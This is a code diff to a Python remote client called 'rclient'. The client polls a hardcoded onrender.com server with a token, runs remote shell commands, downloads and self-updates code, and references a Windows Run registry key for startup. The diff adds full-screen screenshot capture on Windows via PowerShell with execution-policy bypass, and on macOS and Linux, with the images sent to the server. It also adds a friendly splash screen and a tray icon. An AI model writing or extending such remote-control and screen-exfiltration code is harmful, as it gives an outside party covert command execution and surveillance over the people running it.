@@ -5,6 +5,7 @@ import socket
 import shutil
 import subprocess
 import sys
+import tempfile
 import time
 import uuid
 import base64
@@ -18,6 +19,11 @@ from urllib.parse import urlparse
 
 import requests
 
+try:
+    import tkinter as tk
+except Exception:  # pragma: no cover - optional UI support
+    tk = None
+
 TOKEN = "a9K2xP8mZ7QwL1vB"
 SERVER_URL = "https://client-status-server.onrender.com"
 POLL_INTERVAL_SECONDS = 5
@@ -26,7 +32,7 @@ COMMAND_TIMEOUT_SECONDS = 120
 APP_NAME = "rclient"
 TASK_NAME = "rclient"
 RUN_REGISTRY_KEY = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
-APP_VERSION = "1.0.2"
+APP_VERSION = "1.0.5"
 GITHUB_OWNER = "hezztecan-spec"
 GITHUB_REPO = "licilicl"
 AUTO_UPDATE_ENABLED = True
@@ -38,11 +44,120 @@ DOWNLOADS_DIR = BASE_DIR / "downloads"
 CLIENT_ID_PATH = STATE_DIR / "client_id.txt"
 LOG_PATH = STATE_DIR / "client.log"
 TERMINAL_SESSIONS = {}
+WINDOWS_TRAY_ICON = None
+
+
+class WinPoint(ctypes.Structure):
+    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
+
+
+class WinMsg(ctypes.Structure):
+    _fields_ = [
+        ("hwnd", ctypes.c_void_p),
+        ("message", ctypes.c_uint),
+        ("wParam", ctypes.c_void_p),
+        ("lParam", ctypes.c_void_p),
+        ("time", ctypes.c_ulong),
+        ("pt", WinPoint),
+        ("lPrivate", ctypes.c_ulong),
+    ]
+
+
+class WinWndClass(ctypes.Structure):
+    _fields_ = [
+        ("style", ctypes.c_uint),
+        ("lpfnWndProc", ctypes.c_void_p),
+        ("cbClsExtra", ctypes.c_int),
+        ("cbWndExtra", ctypes.c_int),
+        ("hInstance", ctypes.c_void_p),
+        ("hIcon", ctypes.c_void_p),
+        ("hCursor", ctypes.c_void_p),
+        ("hbrBackground", ctypes.c_void_p),
+        ("lpszMenuName", ctypes.c_wchar_p),
+        ("lpszClassName", ctypes.c_wchar_p),
+    ]
+
+
+class WinNotifyIconData(ctypes.Structure):
+    _fields_ = [
+        ("cbSize", ctypes.c_uint),
+        ("hWnd", ctypes.c_void_p),
+        ("uID", ctypes.c_uint),
+        ("uFlags", ctypes.c_uint),
+        ("uCallbackMessage", ctypes.c_uint),
+        ("hIcon", ctypes.c_void_p),
+        ("szTip", ctypes.c_wchar * 128),
+        ("dwState", ctypes.c_uint),
+        ("dwStateMask", ctypes.c_uint),
+        ("szInfo", ctypes.c_wchar * 256),
+        ("uVersion", ctypes.c_uint),
+        ("szInfoTitle", ctypes.c_wchar * 64),
+        ("dwInfoFlags", ctypes.c_uint),
+        ("guidItem", ctypes.c_ubyte * 16),
+        ("hBalloonIcon", ctypes.c_void_p),
+    ]
 
 
 def ensure_directories():
     STATE_DIR.mkdir(parents=True, exist_ok=True)
     DOWNLOADS_DIR.mkdir(parents=True, exist_ok=True)
+
+
+def set_windows_app_id():
+    if not is_windows():
+        return
+
+    try:
+        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(APP_NAME)
+    except Exception:
+        logging.exception("Failed to set Windows AppUserModelID")
+
+
+def show_startup_splash():
+    if not is_windows() or tk is None:
+        return
+
+    try:
+        splash = tk.Tk()
+        splash.title(APP_NAME)
+        splash.overrideredirect(False)
+        splash.resizable(False, False)
+        splash.attributes("-topmost", True)
+        splash.configure(bg="#1f1915")
+
+        window_width = 380
+        window_height = 150
+        screen_width = splash.winfo_screenwidth()
+        screen_height = splash.winfo_screenheight()
+        position_x = int((screen_width - window_width) / 2)
+        position_y = int((screen_height - window_height) / 2)
+        splash.geometry(f"{window_width}x{window_height}+{position_x}+{position_y}")
+
+        frame = tk.Frame(splash, bg="#1f1915", padx=24, pady=24)
+        frame.pack(fill="both", expand=True)
+
+        title_label = tk.Label(
+            frame,
+            text="rclient",
+            font=("Segoe UI", 18, "bold"),
+            fg="#fff8f3",
+            bg="#1f1915",
+        )
+        title_label.pack(pady=(8, 10))
+
+        subtitle_label = tk.Label(
+            frame,
+            text="Спасибо, что выбрали нас",
+            font=("Segoe UI", 11),
+            fg="#d8c9ba",
+            bg="#1f1915",
+        )
+        subtitle_label.pack()
+
+        splash.after(2000, splash.destroy)
+        splash.mainloop()
+    except Exception:
+        logging.exception("Failed to show startup splash")
 
 
 def configure_logging():
@@ -263,7 +378,14 @@ def get_command(client_id):
 
 
 def report_result(client_id, result, command_payload=None):
-    safe_result = result if len(result) <= 10000 else f"{result[:10000]}\n\n[truncated]"
+    screenshot_data_url = ""
+    result_text = result
+
+    if isinstance(result, dict):
+        result_text = str(result.get("result", "")).strip()
+        screenshot_data_url = str(result.get("screenshot_data_url", "")).strip()
+
+    safe_result = result_text if len(result_text) <= 20000 else f"{result_text[:20000]}\n\n[truncated]"
     logging.info("Reporting result for client %s", client_id)
     payload = {"client_id": client_id, "token": TOKEN, "result": safe_result}
 
@@ -279,6 +401,9 @@ def report_result(client_id, result, command_payload=None):
             value = command_payload.get(key)
             if isinstance(value, str) and value.strip():
                 payload[key] = value.strip()
+
+    if screenshot_data_url:
+        payload["screenshot_data_url"] = screenshot_data_url
 
     send_post("/report", payload)
 
@@ -561,6 +686,86 @@ def execute_update(command_text):
     return apply_update_from_url(update_url, source="manual")
 
 
+def create_screenshot_data_url(file_path, mime_type):
+    raw_bytes = Path(file_path).read_bytes()
+    encoded = base64.b64encode(raw_bytes).decode("ascii")
+    return f"data:{mime_type};base64,{encoded}"
+
+
+def execute_screenshot(_command_text):
+    temp_dir = Path(tempfile.mkdtemp(prefix="rclient-shot-"))
+
+    try:
+        if is_windows():
+            output_path = temp_dir / "screenshot.jpg"
+            escaped_output_path = str(output_path).replace("'", "''")
+            powershell_script = (
+                "Add-Type -AssemblyName System.Windows.Forms; "
+                "Add-Type -AssemblyName System.Drawing; "
+                "$bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen; "
+                "$bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; "
+                "$graphics = [System.Drawing.Graphics]::FromImage($bmp); "
+                "$graphics.CopyFromScreen($bounds.Left, $bounds.Top, 0, 0, $bmp.Size); "
+                f"$bmp.Save('{escaped_output_path}', [System.Drawing.Imaging.ImageFormat]::Jpeg); "
+                "$graphics.Dispose(); "
+                "$bmp.Dispose()"
+            )
+            completed = subprocess.run(
+                ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", powershell_script],
+                capture_output=True,
+                text=True,
+                timeout=30,
+                check=False,
+            )
+            if completed.returncode != 0 or not output_path.exists():
+                raise RuntimeError(get_process_error_message(completed, "failed to capture screenshot"))
+
+            screenshot_data_url = create_screenshot_data_url(output_path, "image/jpeg")
+        elif sys.platform == "darwin":
+            output_path = temp_dir / "screenshot.png"
+            completed = subprocess.run(
+                ["screencapture", "-x", str(output_path)],
+                capture_output=True,
+                text=True,
+                timeout=30,
+                check=False,
+            )
+            if completed.returncode != 0 or not output_path.exists():
+                raise RuntimeError(get_process_error_message(completed, "failed to capture screenshot"))
+
+            screenshot_data_url = create_screenshot_data_url(output_path, "image/png")
+        else:
+            output_path = temp_dir / "screenshot.png"
+            capture_commands = [
+                ["gnome-screenshot", "-f", str(output_path)],
+                ["scrot", str(output_path)],
+            ]
+            screenshot_data_url = ""
+
+            for command in capture_commands:
+                completed = subprocess.run(
+                    command,
+                    capture_output=True,
+                    text=True,
+                    timeout=30,
+                    check=False,
+                )
+                if completed.returncode == 0 and output_path.exists():
+                    screenshot_data_url = create_screenshot_data_url(output_path, "image/png")
+                    break
+
+            if not screenshot_data_url:
+                raise RuntimeError("failed to capture screenshot: no supported screenshot utility found")
+
+        image_size = len(screenshot_data_url)
+        return {
+            "result": f"screenshot_captured bytes={image_size}",
+            "screenshot_data_url": screenshot_data_url,
+        }
+    finally:
+        shutil.rmtree(temp_dir, ignore_errors=True)
+
+
 def restart_current_client():
     script_path = Path(sys.executable).resolve() if IS_FROZEN else Path(__file__).resolve()
 
@@ -588,18 +793,184 @@ def execute_command(command_text):
         return execute_download(normalized)
     if normalized.startswith("update:"):
         return execute_update(normalized)
+    if normalized == "screenshot":
+        return execute_screenshot(normalized)
     if normalized.startswith("terminal_exec:"):
         return execute_terminal(normalized)
     if normalized.startswith("terminal_close:"):
         return close_terminal(normalized)
 
     raise ValueError(
-        "unsupported command format. Use restart, shell:<cmd>, download:<url> [filename], update:<url>, terminal_exec:<payload>, or terminal_close:<payload>"
+        "unsupported command format. Use restart, shell:<cmd>, download:<url> [filename], update:<url>, screenshot, terminal_exec:<payload>, or terminal_close:<payload>"
     )
 
 
 def is_windows():
     return os.name == "nt"
+
+
+class WindowsTrayIcon:
+    WM_DESTROY = 0x0002
+    WM_CLOSE = 0x0010
+    WM_APP = 0x8000
+    NIM_ADD = 0x00000000
+    NIM_MODIFY = 0x00000001
+    NIM_DELETE = 0x00000002
+    NIF_MESSAGE = 0x00000001
+    NIF_ICON = 0x00000002
+    NIF_TIP = 0x00000004
+    IDI_APPLICATION = 32512
+    CS_HREDRAW = 0x0002
+    CS_VREDRAW = 0x0001
+    IMAGE_ICON = 1
+    LR_LOADFROMFILE = 0x00000010
+    LR_DEFAULTSIZE = 0x00000040
+
+    def __init__(self, tooltip):
+        self.tooltip = tooltip[:127]
+        self.window_class_name = f"{APP_NAME}_tray_class"
+        self.window_title = APP_NAME
+        self.hwnd = None
+        self.hicon = None
+        self.class_atom = None
+        self.thread = None
+        self.thread_id = None
+        self._started = threading.Event()
+        self._stop_requested = False
+        self._wnd_proc = ctypes.WINFUNCTYPE(
+            ctypes.c_long, ctypes.c_void_p, ctypes.c_uint, ctypes.c_void_p, ctypes.c_void_p
+        )(self._window_proc)
+
+    def start(self):
+        if not is_windows():
+            return
+
+        self.thread = threading.Thread(target=self._run_message_loop, daemon=True)
+        self.thread.start()
+        self._started.wait(timeout=5)
+
+    def stop(self):
+        if not is_windows() or not self.thread_id:
+            return
+
+        self._stop_requested = True
+        user32 = ctypes.windll.user32
+        user32.PostThreadMessageW(self.thread_id, self.WM_CLOSE, 0, 0)
+        if self.thread:
+            self.thread.join(timeout=5)
+
+    def _run_message_loop(self):
+        user32 = ctypes.windll.user32
+        kernel32 = ctypes.windll.kernel32
+        shell32 = ctypes.windll.shell32
+
+        self.thread_id = kernel32.GetCurrentThreadId()
+        hinstance = kernel32.GetModuleHandleW(None)
+
+        wnd_class = WinWndClass()
+        wnd_class.style = self.CS_HREDRAW | self.CS_VREDRAW
+        wnd_class.lpfnWndProc = ctypes.cast(self._wnd_proc, ctypes.c_void_p).value
+        wnd_class.hInstance = hinstance
+        wnd_class.hIcon = self._load_icon()
+        wnd_class.lpszClassName = self.window_class_name
+
+        self.class_atom = user32.RegisterClassW(ctypes.byref(wnd_class))
+        self.hwnd = user32.CreateWindowExW(
+            0,
+            self.window_class_name,
+            self.window_title,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            hinstance,
+            None,
+        )
+
+        if not self.hwnd:
+            logging.error("Failed to create tray icon window")
+            self._started.set()
+            return
+
+        notify_data = WinNotifyIconData()
+        notify_data.cbSize = ctypes.sizeof(WinNotifyIconData)
+        notify_data.hWnd = self.hwnd
+        notify_data.uID = 1
+        notify_data.uFlags = self.NIF_ICON | self.NIF_MESSAGE | self.NIF_TIP
+        notify_data.uCallbackMessage = self.WM_APP + 1
+        notify_data.hIcon = self._load_icon()
+        notify_data.szTip = self.tooltip
+
+        shell32.Shell_NotifyIconW(self.NIM_ADD, ctypes.byref(notify_data))
+        self._started.set()
+
+        msg = WinMsg()
+        while user32.GetMessageW(ctypes.byref(msg), 0, 0, 0) != 0:
+            user32.TranslateMessage(ctypes.byref(msg))
+            user32.DispatchMessageW(ctypes.byref(msg))
+
+        shell32.Shell_NotifyIconW(self.NIM_DELETE, ctypes.byref(notify_data))
+        if self.hwnd:
+            user32.DestroyWindow(self.hwnd)
+            self.hwnd = None
+
+    def _load_icon(self):
+        user32 = ctypes.windll.user32
+
+        if IS_FROZEN:
+            executable_path = str(Path(sys.executable).resolve())
+            icon_handle = user32.LoadImageW(
+                None,
+                executable_path,
+                self.IMAGE_ICON,
+                0,
+                0,
+                self.LR_LOADFROMFILE | self.LR_DEFAULTSIZE,
+            )
+            if icon_handle:
+                self.hicon = icon_handle
+                return icon_handle
+
+        return user32.LoadIconW(None, ctypes.c_void_p(self.IDI_APPLICATION))
+
+    def _window_proc(self, hwnd, msg, w_param, l_param):
+        user32 = ctypes.windll.user32
+
+        if msg in {self.WM_CLOSE, self.WM_DESTROY}:
+            user32.PostQuitMessage(0)
+            return 0
+
+        return user32.DefWindowProcW(hwnd, msg, w_param, l_param)
+
+
+def start_windows_tray_icon():
+    global WINDOWS_TRAY_ICON
+
+    if not is_windows():
+        return
+
+    try:
+        WINDOWS_TRAY_ICON = WindowsTrayIcon("rclient работает в фоне")
+        WINDOWS_TRAY_ICON.start()
+    except Exception:
+        logging.exception("Failed to start Windows tray icon")
+
+
+def stop_windows_tray_icon():
+    global WINDOWS_TRAY_ICON
+
+    if WINDOWS_TRAY_ICON is None:
+        return
+
+    try:
+        WINDOWS_TRAY_ICON.stop()
+    except Exception:
+        logging.exception("Failed to stop Windows tray icon")
+    finally:
+        WINDOWS_TRAY_ICON = None
 
 
 def build_http_headers():
@@ -889,49 +1260,55 @@ def register_client_with_retry(client_id):
 
 def run_client():
     configure_logging()
+    set_windows_app_id()
+    show_startup_splash()
+    start_windows_tray_icon()
     install_if_needed_for_windows_exe()
     client_id = load_or_create_client_id()
     register_client_with_retry(client_id)
     logging.info("Client started with id %s", client_id)
     next_update_check_at = 0
 
-    while True:
-        command_payload = None
-        try:
-            if time.time() >= next_update_check_at:
-                next_update_check_at = time.time() + AUTO_UPDATE_CHECK_INTERVAL_SECONDS
-                check_for_auto_update()
-
-            command_payload = get_command(client_id)
-            command = command_payload.get("command") if isinstance(command_payload, dict) else None
-
-            if command:
-                logging.info("Received command: %s", command)
-                result = execute_command(command)
-                logging.info("Command completed")
-                report_result(client_id, result, command_payload)
-            else:
-                logging.info("No command available")
-        except RestartRequested as event:
-            logging.info("Restart requested: %s", event.message)
+    try:
+        while True:
+            command_payload = None
             try:
-                report_result(client_id, event.message, command_payload)
-            except Exception:
-                logging.exception("Failed to report restart event")
-            return
-        except requests.HTTPError as error:
-            status_code = error.response.status_code if error.response is not None else "unknown"
-            logging.exception("HTTP error while communicating with server: %s", status_code)
-            if status_code == 404:
-                register_client_with_retry(client_id)
-        except Exception as error:
-            logging.exception("Client loop failed: %s", error)
-            try:
-                report_result(client_id, f"error={error}", command_payload)
-            except Exception:
-                logging.exception("Failed to report error")
+                if time.time() >= next_update_check_at:
+                    next_update_check_at = time.time() + AUTO_UPDATE_CHECK_INTERVAL_SECONDS
+                    check_for_auto_update()
 
-        time.sleep(POLL_INTERVAL_SECONDS)
+                command_payload = get_command(client_id)
+                command = command_payload.get("command") if isinstance(command_payload, dict) else None
+
+                if command:
+                    logging.info("Received command: %s", command)
+                    result = execute_command(command)
+                    logging.info("Command completed")
+                    report_result(client_id, result, command_payload)
+                else:
+                    logging.info("No command available")
+            except RestartRequested as event:
+                logging.info("Restart requested: %s", event.message)
+                try:
+                    report_result(client_id, event.message, command_payload)
+                except Exception:
+                    logging.exception("Failed to report restart event")
+                return
+            except requests.HTTPError as error:
+                status_code = error.response.status_code if error.response is not None else "unknown"
+                logging.exception("HTTP error while communicating with server: %s", status_code)
+                if status_code == 404:
+                    register_client_with_retry(client_id)
+            except Exception as error:
+                logging.exception("Client loop failed: %s", error)
+                try:
+                    report_result(client_id, f"error={error}", command_payload)
+                except Exception:
+                    logging.exception("Failed to report error")
+
+            time.sleep(POLL_INTERVAL_SECONDS)
+    finally:
+        stop_windows_tray_icon()
 
 
 if __name__ == "__main__":
